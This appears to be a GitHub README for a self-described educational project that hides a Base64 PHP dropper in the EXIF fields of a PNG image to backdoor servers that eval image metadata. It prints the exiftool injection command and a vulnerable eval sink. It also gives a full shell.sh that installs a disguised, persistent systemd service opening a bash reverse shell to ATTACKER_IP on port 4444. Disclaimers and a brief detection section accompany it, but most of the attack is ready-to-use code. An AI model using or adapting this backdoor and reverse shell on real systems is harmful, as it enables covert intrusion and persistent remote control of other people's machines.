Backdoor Stealth Image Injection

## Overview
This project demonstrates how an attacker can embed a Base64-encoded malicious payload inside the EXIF metadata of a valid `.png` image. Once uploaded to a vulnerable server, the image can trigger remote command execution or download further malware.

This educational repository simulates:
- A valid `stealth_shell.png` with hidden malware in its EXIF fields.
- A PHP dropper payload (`base64_php_payload.txt`) that retrieves and executes a persistent backdoor.
- A malicious `shell.sh` that sets up a systemd-based reverse shell.

Author: [BackdoorAli](https://github.com/BackdoorAli)

> For educational purposes only. Do not deploy in production or unethical environments.

---

## Files Included

| File                    | Description |
|-------------------------|-------------|
| `stealth_shell.png`     | Image containing the Base64-encoded PHP payload injected into EXIF fields |
| `base64_php_payload.txt`| The actual Base64-encoded dropper PHP payload |
| `shell.sh`              | Systemd-based reverse shell that gets downloaded and executed |

---

## How the Attack Works

1. Image Creation
   - A valid `.png` image is prepared (e.g., a portrait of myself for this specific project - refer to my GitHub's pfp).

2. Payload Preparation
   - A PHP payload is written that:
     - Uses `curl` to download `shell.sh`.
     - Saves it to `/tmp/.m`.
     - Makes it executable and runs it in the background.

3. EXIF Injection
   - The Base64-encoded PHP is injected into `Comment`, `UserComment`, and `Software` EXIF fields using `exiftool`:
     ```bash
     exiftool \
       -Comment="$(cat base64_php_payload.txt)" \
       -UserComment="$(cat base64_php_payload.txt)" \
       -Software="$(cat base64_php_payload.txt)" \
       stealth_shell.png
     ```

4. Execution (Hypothetical)
   - If a vulnerable backend server extracts the EXIF metadata and passes it to something like:
     ```php
     eval(base64_decode($image_exif_data['Comment']));
     ```
   - Then the PHP dropper is executed, downloads the backdoor, and grants persistent shell access.

---

## Backdoor (`shell.sh`)

This script creates a persistent systemd service that launches a reverse shell to an attacker's machine.

```bash
#!/bin/bash
SERVICE_NAME="system-netupd"
SHELL_CMD="/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=Network Updater (Critical)
After=network.target

[Service]
ExecStart=$SHELL_CMD
Restart=always
Type=simple

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME
```

Replace `ATTACKER_IP` with your actual listener IP/port. >>> AGAIN, hypothetically! <<<

---

## Detection & Extraction
To view the injected payload:
```bash
exiftool stealth_shell.png | grep -i comment
```

To decode:
```bash
echo "<base64_output>" | base64 -d
```

---

## Defensive measures
See `defense.md` for detailed strategies on detecting and preventing EXIF-based malware delivery.

---

## Disclaimer
This project is for educational and research purposes only. Unauthorized deployment, testing, or use of this payload outside of a legal lab or your own system is strictly prohibited and of YOUR OWN RESPONSIBILITY.
